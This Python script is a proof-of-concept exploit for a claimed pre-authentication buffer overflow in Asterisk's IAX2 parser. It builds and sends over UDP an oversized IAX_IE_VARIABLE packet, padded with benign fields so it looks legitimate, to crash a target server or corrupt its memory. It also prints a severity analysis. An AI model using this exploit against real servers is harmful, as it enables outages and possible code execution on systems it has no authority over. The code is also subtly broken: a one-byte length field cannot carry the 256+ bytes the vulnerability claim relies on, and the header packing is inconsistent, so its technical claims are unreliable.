#!/usr/bin/env python3
"""
Proof of Concept: IAX2 IAX_IE_VARIABLE Buffer Overflow
========================================================

AUTHORIZED TESTING ONLY - For vulnerability validation and patch verification

This POC demonstrates CVE-PENDING: Buffer overflow in iax_parse_ies()
when processing IAX_IE_VARIABLE information elements.

Vulnerability Location: channels/iax2/parser.c:1127
Vulnerable Code:
    case IAX_IE_VARIABLE:
        ast_copy_string(tmp, (char *)data + 2, len + 1);  // tmp is 256 bytes

The bug: When len >= 256, this copies up to 257 bytes into a 256-byte buffer.

Attack Vector: Send IAX_COMMAND_NEW with malicious VARIABLE IE
Affected Versions: Asterisk with IAX2 support (needs verification)
Impact: Stack buffer overflow -> potential code execution

WARNING: Use only on systems you own/control. Unauthorized testing is illegal.
"""

import socket
import struct
import sys

# IAX2 Protocol Constants
IAX_DEFAULT_PORT = 4569

# Frame types
AST_FRAME_IAX = 6

# IAX Commands (subclass)
IAX_COMMAND_NEW = 1

# Information Element Types
IAX_IE_CALLED_NUMBER = 1
IAX_IE_CALLING_NUMBER = 2
IAX_IE_USERNAME = 6
IAX_IE_FORMAT = 9
IAX_IE_CAPABILITY = 8
IAX_IE_VERSION = 11
IAX_IE_VARIABLE = 52  # The vulnerable IE type

# IAX Flags
IAX_FLAG_FULL = 0x8000


def create_iax2_full_header(scallno, dcallno, timestamp, oseqno, iseqno, frametype, subclass):
    """
    Create IAX2 full frame header

    struct ast_iax2_full_hdr {
        unsigned short scallno;   // Source call number (high bit must be 1)
        unsigned short dcallno;   // Destination call number
        unsigned int ts;          // 32-bit timestamp
        unsigned char oseqno;     // Outgoing sequence number
        unsigned char iseqno;     // Incoming sequence number
        unsigned char type;       // Frame type
        unsigned char csub;       // Compressed subclass
        unsigned char iedata[0];  // Information elements follow
    }
    """
    # Set high bit on scallno to indicate full frame
    scallno |= IAX_FLAG_FULL

    header = struct.pack(
        '!HHIHBBBB',
        scallno,    # Source call number (network byte order)
        dcallno,    # Destination call number
        timestamp,  # Timestamp
        oseqno,     # Outgoing sequence
        iseqno,     # Incoming sequence
        frametype,  # Frame type
        subclass,   # Subclass
        0           # Padding byte
    )

    return header[:-1]  # Remove padding byte


def create_ie(ie_type, data):
    """
    Create an Information Element
    Format: [1 byte type][1 byte length][data]
    """
    if isinstance(data, str):
        data = data.encode('utf-8')

    length = len(data)
    return struct.pack('BB', ie_type, length) + data


def create_malicious_variable_ie(overflow_size=260):
    """
    Create a malicious VARIABLE IE that triggers the buffer overflow

    The vulnerability: parser.c copies (len + 1) bytes into 256-byte buffer
    Setting len to 256 or more causes overflow

    Format of VARIABLE IE: "varname=value"
    """
    # Create a payload that will overflow the 256-byte buffer
    # We'll make it slightly over to clearly trigger the overflow
    varname = "A" * 10
    varvalue = "B" * (overflow_size - len(varname) - 1)  # -1 for '='
    payload = f"{varname}={varvalue}"

    return create_ie(IAX_IE_VARIABLE, payload)


def create_benign_ies():
    """Create some benign IEs to make the packet look more legitimate"""
    ies = b''

    # Add some standard IEs
    ies += create_ie(IAX_IE_VERSION, struct.pack('!H', 2))  # Protocol version 2
    ies += create_ie(IAX_IE_CALLED_NUMBER, b's')  # Extension 's'
    ies += create_ie(IAX_IE_CALLING_NUMBER, b'12345')
    ies += create_ie(IAX_IE_USERNAME, b'testuser')
    ies += create_ie(IAX_IE_CAPABILITY, struct.pack('!I', 0x00000004))  # ulaw
    ies += create_ie(IAX_IE_FORMAT, struct.pack('!I', 0x00000004))

    return ies


def create_attack_packet(overflow_size=260, legitimate_looking=True):
    """
    Create a malicious IAX2 NEW packet with oversized VARIABLE IE

    Args:
        overflow_size: Total size of VARIABLE IE payload (default 260 > 256)
        legitimate_looking: Add benign IEs to avoid obvious malformation

    Returns:
        bytes: Complete IAX2 packet ready to send
    """
    # Craft the full frame header for IAX_COMMAND_NEW
    header = create_iax2_full_header(
        scallno=1234,           # Our call number
        dcallno=0,              # No destination call yet (new call)
        timestamp=0,            # Initial timestamp
        oseqno=0,               # First packet
        iseqno=0,               # Haven't received anything
        frametype=AST_FRAME_IAX,  # IAX control frame
        subclass=IAX_COMMAND_NEW  # NEW command
    )

    # Create Information Elements
    ies = b''

    if legitimate_looking:
        # Add benign IEs first to pass initial validation
        ies += create_benign_ies()

    # Add the malicious VARIABLE IE that triggers overflow
    ies += create_malicious_variable_ie(overflow_size)

    # Combine header and IEs
    packet = header + ies

    return packet


def send_poc_packet(target_ip, target_port=IAX_DEFAULT_PORT, overflow_size=260):
    """
    Send the malicious packet to target Asterisk server

    Args:
        target_ip: IP address of target Asterisk server
        target_port: IAX2 port (default 4569)
        overflow_size: Size of overflow (default 260 bytes > 256 buffer)
    """
    print(f"[*] IAX2 VARIABLE IE Buffer Overflow POC")
    print(f"[*] Target: {target_ip}:{target_port}")
    print(f"[*] Overflow size: {overflow_size} bytes (buffer is 256 bytes)")
    print(f"[*] Creating malicious IAX2 packet...")

    # Create the malicious packet
    packet = create_attack_packet(overflow_size=overflow_size)

    print(f"[*] Packet size: {len(packet)} bytes")
    print(f"[*] Packet structure:")
    print(f"    - Header: 12 bytes")
    print(f"    - IEs: {len(packet) - 12} bytes")

    # Create UDP socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(2.0)

    try:
        print(f"[*] Sending malicious packet...")
        sock.sendto(packet, (target_ip, target_port))
        print(f"[+] Packet sent successfully")

        print(f"[*] Waiting for response (or crash)...")
        try:
            data, addr = sock.recvfrom(4096)
            print(f"[*] Received response: {len(data)} bytes")
            print(f"[!] Server may have survived (check logs for crash/corruption)")
            return data
        except socket.timeout:
            print(f"[!] No response received (timeout)")
            print(f"[!] Server may have crashed or dropped packet")
            print(f"[!] Check target system logs and process status")

    except Exception as e:
        print(f"[-] Error sending packet: {e}")
    finally:
        sock.close()


def create_test_vectors():
    """Generate multiple test cases with different overflow sizes"""
    test_cases = [
        ("Boundary: exactly 256 bytes", 256),
        ("Small overflow: 260 bytes", 260),
        ("Medium overflow: 300 bytes", 300),
        ("Large overflow: 512 bytes", 512),
        ("Extreme overflow: 1024 bytes", 1024),
    ]

    print("[*] Generating test vectors...\n")

    for description, size in test_cases:
        packet = create_attack_packet(overflow_size=size, legitimate_looking=False)
        print(f"{description}:")
        print(f"  Payload size: {size} bytes")
        print(f"  Total packet: {len(packet)} bytes")
        print(f"  Overflow amount: {size - 255} bytes")
        print(f"  Hex (first 32 bytes): {packet[:32].hex()}")
        print()


def analyze_vulnerability():
    """Print detailed analysis of the vulnerability"""
    print("=" * 70)
    print("VULNERABILITY ANALYSIS")
    print("=" * 70)
    print()
    print("File: channels/iax2/parser.c")
    print("Function: iax_parse_ies()")
    print("Line: 1127")
    print()
    print("Vulnerable Code:")
    print("    case IAX_IE_VARIABLE:")
    print("        ast_copy_string(tmp, (char *)data + 2, len + 1);")
    print("        ^^^^^^^^^^^^^^^^^^^ copies (len+1) bytes")
    print("        ^^^                 into 256-byte buffer")
    print()
    print("Buffer Declaration (line 800):")
    print("    char tmp[256], *tmp2;")
    print("         ^^^^^^^^ only 256 bytes")
    print()
    print("The Problem:")
    print("  - IE format: [type:1][len:1][data:len]")
    print("  - When len=255, ast_copy_string tries to copy 256 bytes")
    print("  - When len=256+, overflow occurs")
    print("  - No bounds checking before copy")
    print()
    print("Exploitation:")
    print("  - Send IAX_COMMAND_NEW with VARIABLE IE")
    print("  - Set len field to 256 or larger")
    print("  - Overflow overwrites stack (256+ bytes)")
    print("  - Can potentially overwrite return address")
    print("  - No authentication required (pre-auth vulnerability)")
    print()
    print("CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H")
    print("CVSS Score: 9.8 (CRITICAL)")
    print("=" * 70)
    print()


def main():
    """Main POC execution"""
    if len(sys.argv) < 2:
        print("IAX2 VARIABLE IE Buffer Overflow - Proof of Concept")
        print("=" * 60)
        print()
        print("Usage:")
        print(f"  {sys.argv[0]} <target_ip> [port] [overflow_size]")
        print()
        print("Examples:")
        print(f"  {sys.argv[0]} 192.168.1.100")
        print(f"  {sys.argv[0]} 192.168.1.100 4569 260")
        print(f"  {sys.argv[0]} analyze    # Show vulnerability analysis")
        print(f"  {sys.argv[0]} vectors    # Generate test vectors")
        print()
        print("WARNING: Only test against systems you own/control!")
        print()
        sys.exit(1)

    if sys.argv[1] == "analyze":
        analyze_vulnerability()
        sys.exit(0)

    if sys.argv[1] == "vectors":
        create_test_vectors()
        sys.exit(0)

    target_ip = sys.argv[1]
    target_port = int(sys.argv[2]) if len(sys.argv) > 2 else IAX_DEFAULT_PORT
    overflow_size = int(sys.argv[3]) if len(sys.argv) > 3 else 260

    print()
    analyze_vulnerability()
    print()

    response = input(f"Send POC packet to {target_ip}:{target_port}? (yes/no): ")
    if response.lower() != 'yes':
        print("Aborted.")
        sys.exit(0)

    send_poc_packet(target_ip, target_port, overflow_size)


if __name__ == "__main__":
    main()
